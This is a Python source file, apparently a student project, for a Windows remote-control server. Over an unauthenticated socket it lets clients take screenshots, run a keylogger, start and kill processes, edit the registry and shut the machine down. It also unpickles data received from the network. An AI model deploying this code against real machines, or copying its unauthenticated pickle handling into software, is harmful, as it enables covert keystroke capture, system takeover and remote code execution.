import socket
import pickle
from boltons import socketutils
from pynput import keyboard
from PIL import ImageGrab
import os
import threading
import subprocess
from winreg import *
from tempfile import NamedTemporaryFile
import win32gui
import win32process


SERVER = ""
PORT = 1234

class ServerServices:
    def __init__(self):
        self.clients = list()
        self.server = None
        self.server_thread = None

    def clientCount(self):
        count = 0
        for client in self.clients:
                if client.conn != None:
                    count += 1
        return count

    def startServices(self):
        print('START SERVER')
        self.createSocket()
        self.server_thread = threading.Thread(target = self.addConnection)
        self.server_thread.start()


    def stopServices(self):
        print('STOP SERVER')
        
        try:
            for client in self.clients:
                if client.conn != None:
                    client.closeConnection()
        except:
            pass
        
        # tránh lỗi trên cell
        try:
            server = self.server
            self.server = None
            # server.shutdown(socket.SHUT_RDWR)
            server.close()
        finally:
            self.server_thread.join()

    # create socket
    def createSocket(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((SERVER, PORT))
                               
        print(f"Port: {PORT}")
        self.server.listen()


    def addConnection(self):
        while True:
            try:
                conn, addr = self.server.accept()

                client = Client(conn, addr)
                client.startConnection()
                self.clients.append(client)

            except:
                if self.server == None:
                    print('Server stopped. Exit thread')
                else:
                    self.server = None
                    print('Server have unexpected error. Exit thread')
                break

            
    

class Client:
    def __init__(self, conn, addr):
        self.buff = None
        self.conn = conn
        self.addr = addr
        self.client_thread = None
        self.DELIM = b'\x00'


    def startConnection(self):
        print(f'{self.addr} \tSTART CONNECTION')
        self.buff = socketutils.BufferedSocket(self.conn, None)
        self.client_thread = threading.Thread(target = self.services)
        self.client_thread.start()


    #close connection
    def closeConnection(self):
        print(f'{self.addr} \tCLOSE CONNECTION')

        try:
            conn = self.conn
            self.conn = None
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
        finally:
            self.client_thread.join()


    def services(self):
        while True:
            try:
                flag = self.buff.recv_until(b'!F!').decode()
                print(f'{self.addr} \tReceive: {flag}')
                
                if flag == 'screenshot':
                    self.sendScreenshot()
                elif flag == 'processlist':
                    self.sendProcessList()
                elif flag == 'killprocess':
                    self.getKillProcess()
                elif flag == 'startprocess':
                    self.getStartProcess()
                elif flag == 'applist':
                    self.sendAppList()
                elif flag == 'keylogger':
                    self.keylogger_Server()
                elif flag == 'regfile':
                    self.getRegFile()
                elif flag == 'reggetval':
                    self.sendRegVal()
                elif flag == 'regsetval':
                    self.getSetRegVal()
                elif flag == 'regdelval':
                    self.getDelRegVal()
                elif flag == 'regcreatekey':
                    self.getCreateReyKey()
                elif flag == 'regdelkey':
                    self.getDelRegKey()
                elif flag == 'shutdown':
                    self.getShutdown() 
                elif flag == 'close':
                    self.closeConnection()
                elif flag == 'ping':
                    self.sendOK()

            except:
                if self.conn == None:
                    print(f'{self.addr} \tClient closed. Exit thread')
                else:
                    self.conn = None
                    print(f'{self.addr} \tClient have unexpected error. Exit thread')
                break

    # ping func
    def sendOK(self):
        self.buff.send('OK'.encode() + self.DELIM)

    # dump func
    def sendDump(self, var):
        dump = pickle.dumps(var)
        dump_size = len(dump)

        self.buff.send(str(dump_size).encode() + self.DELIM)
        self.buff.send(dump)
        print(f'{self.addr} \tSent dump data. Size: {dump_size}')
    
    def recvDump(self): 
        dump_size = int(self.buff.recv_until(self.DELIM).decode())
        dump = self.buff.recv_size(dump_size)

        print(f'\tReceived dump data, size: {dump_size}')
        return pickle.loads(dump)

    # cmd func
    def getResultCMD(self, cmd, headers):
        lines = subprocess.Popen(cmd, stdout=subprocess.PIPE)

        firstLine = lines.stdout.readline().decode().rstrip()
        align = []
        for header in headers:
            align.append(firstLine.find(header))
        align.append(len(firstLine) + 1)
        
        result = []
        for l in lines.stdout:
            if l.rstrip():
                line = l.decode().rstrip()
                row = []
                for i in range(len(align) - 1):
                    row.append(line[align[i] : align[i + 1] - 1].rstrip())
                result.append(row)

        return result


    #  screenshot func
    def sendScreenshot(self):
        print(f'{self.addr} \tSEND SCREENSHOT')
        try:
            image = ImageGrab.grab()
        except:
            image = None
            print(f'{self.addr} \tError: Unable to take screenshot')
        
        self.sendDump(image)


    # process list func
    def sendProcessList(self):
        print(f'{self.addr} \tSEND PROCESS LIST')
        # f = wmi.WMI()

        # process_data = []
        # for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
        #     process_data.append([process.ProcessId, process.Name, process.ThreadCount])
        try:
            process_data = self.getResultCMD('wmic process get description, processid, threadcount', ['Description', 'ProcessId', 'ThreadCount'])
        except:
            process_data = None
            print(f'{self.addr} \tError: Unable to get process list')

        self.sendDump(process_data)

    # kill process func
    def getKillProcess(self):
        print(f'{self.addr} \tKILL PROCESS')
        pid = self.buff.recv_until(self.DELIM).decode()
        
        try:
            pid = int(pid)
            os.kill(pid, 9)
        except:
            print(f'{self.addr} \t\tErr: Unable to kill {pid}')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)

    # start process func
    def getStartProcess(self):
        print(f'{self.addr} \tSTART PROCESS')
        name = self.buff.recv_until(self.DELIM).decode()
        
        try:
            subprocess.Popen(name)
        except:
            print(f'{self.addr} \t\tErr: Unable to start {name}')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)

    
    #send app list
    def sendAppList(self):
        def getAllWindows(hwnd, result):
            name = win32gui.GetWindowText(hwnd)
            isVisible = win32gui.IsWindowVisible(hwnd)
            nID = win32process.GetWindowThreadProcessId(hwnd)

            if name != '' and isVisible:
                result.append(str(nID[1]))
            return True

        print(f'{self.addr} \tSEND APP LIST')
        try:
            result = []
            win32gui.EnumWindows(getAllWindows, result)
        except:
            result = None
            print(f'{self.addr} \tError: Unable to get app list')
        
        self.sendDump(result)


    # keylogger func
    def keylogger_Server(self):
        print(f'{self.addr} \tKEYLOGGER FUNCTION')
        string = ''
        listener = None
        
        def on_press(key):
            nonlocal string
            try:
                string += key.char
            except AttributeError:
                _key = str(key).split('.')[1].upper()

                if _key == 'ENTER':
                    string += f'[{_key}]\n'
                # elif _key == 'SPACE':
                #     string += ' '
                # elif _key == 'BACKSPACE':
                #     string = string[:-1]
                else:
                    string += f'[{_key}]'
            except:
                pass
            
        while True:
            flag = self.buff.recv_until(self.DELIM).decode()
            print(f'{self.addr} \t\tReceive: {flag}')
            
            if flag == 'hook' and listener == None:
                try:
                    listener = keyboard.Listener(on_press = on_press)
                    listener.start()
                except:
                    listener = None
                    self.buff.send('ER'.encode() + self.DELIM)
                else:
                    self.buff.send('OK'.encode() + self.DELIM)

            elif flag == 'unhook' and listener != None:
                try:
                    listener.stop()
                finally:
                    listener = None

            elif flag == 'clear':
                string = ''

            elif flag == 'send':
                self.buff.send(string.encode() + self.DELIM)

            elif flag == 'exit':
                if listener != None:
                    try:
                        listener.stop()
                    except:
                        pass
                break


    def getRegFile(self):
        print(f'{self.addr} \tMERGE REG FILE')
        data = self.buff.recv_until(self.DELIM).decode()

        try:
            f = NamedTemporaryFile(mode = 'w', encoding = 'utf-16', delete = False)
            f.write(data)
            f.close()

            res = subprocess.run(f'reg import \"{f.name}\"', capture_output = True)
            os.remove(f.name)
            if res.stderr.decode().rstrip().find('ERROR') != -1:
                raise Exception
        except:
            print(f'{self.addr} \tErr: merge registry file')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)

            

    def sendRegVal(self):
        print(f'{self.addr} \tSEND REG VALUE')
        path = self.buff.recv_until(self.DELIM).decode()
        value = self.buff.recv_until(self.DELIM).decode()

        try:
            hkey, key = path.split('\\', 1)
            result = QueryValueEx(OpenKeyEx(getHKEY(hkey), key, 0, KEY_QUERY_VALUE), value)
        except:
            print(f'{self.addr} \tErr: send registry value')
            self.sendDump(('ER',))
        else:
            self.sendDump((result[0], returnType(result[1])))
        
    def getSetRegVal(self):
        print(f'{self.addr} \tSET REG VALUE')
        path = self.buff.recv_until(self.DELIM).decode()
        value = self.buff.recv_until(self.DELIM).decode()
        type = self.buff.recv_until(self.DELIM).decode()
        data = self.recvDump()

        try:
            hkey, key = path.split('\\', 1)
            SetValueEx(OpenKeyEx(getHKEY(hkey), key, 0, KEY_SET_VALUE), value, 0, getType(type), data)
        except:
            print(f'{self.addr} \tErr: set registry value')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)

    def getDelRegVal(self):
        print(f'{self.addr} \tDEL REG VALUE')
        path = self.buff.recv_until(self.DELIM).decode()
        value = self.buff.recv_until(self.DELIM).decode()

        try:
            hkey, key = path.split('\\', 1)
            DeleteValue(OpenKeyEx(getHKEY(hkey), key, 0, KEY_SET_VALUE), value)
        except:
            print(f'{self.addr} \tErr: delete registry value')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)  

    def getCreateReyKey(self):
        print(f'{self.addr} \tCREATE REG KEY')
        path = self.buff.recv_until(self.DELIM).decode()
        hkey, key = path.split('\\', 1)

        try:
            CreateKeyEx(getHKEY(hkey), key, 0, KEY_CREATE_SUB_KEY)
        except:
            print(f'{self.addr} \tErr: create registry key')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)

    def getDelRegKey(self):
        print(f'{self.addr} \tDEL REG KEY')
        path = self.buff.recv_until(self.DELIM).decode()
        hkey, key = path.split('\\', 1)

        try:
            DeleteKeyEx(getHKEY(hkey), key)
        except:
            print(f'{self.addr} \tErr: delete registry key')
            self.buff.send('ER'.encode() + self.DELIM)
        else:
            self.buff.send('OK'.encode() + self.DELIM)

    
    def getShutdown(self):
        print(f'{self.addr} \tSHUTDOWN')
        try:
            subprocess.run('shutdown /s /t 0')
        except:
            pass
        

def getHKEY(name):
    if name == "HKEY_CLASSES_ROOT":
        return HKEY_CLASSES_ROOT
    elif name == "HKEY_CURRENT_USER":
        return HKEY_CURRENT_USER
    elif name == "HKEY_LOCAL_MACHINE":
        return HKEY_LOCAL_MACHINE
    elif name == "HKEY_USERS":
        return HKEY_USERS
    elif name == 'HKEY_PERFORMANCE_DATA':
        return HKEY_PERFORMANCE_DATA
    elif name == 'HKEY_CURRENT_CONFIG':
        return HKEY_CURRENT_CONFIG
    elif name == 'HKEY_DYN_DATA':
        return HKEY_DYN_DATA

def getType(type):
    if type == 'String':
        return REG_SZ
    elif type == 'Binary':
        return REG_BINARY
    elif type == 'DWORD':
        return REG_DWORD
    elif type == 'QWORD':
        return REG_QWORD
    elif type == 'Multi-String':
        return REG_MULTI_SZ
    elif type == 'Expandable String':
        return REG_EXPAND_SZ 

def returnType(type):
    if type == REG_SZ:
        return 'String'
    elif type == REG_BINARY:
        return 'Binary'
    elif type == REG_DWORD:
        return 'DWORD'
    elif type == REG_QWORD:
        return 'QWORD'
    elif type == REG_MULTI_SZ:
        return 'Multi-String'
    elif type == REG_EXPAND_SZ:
        return 'Expandable String' 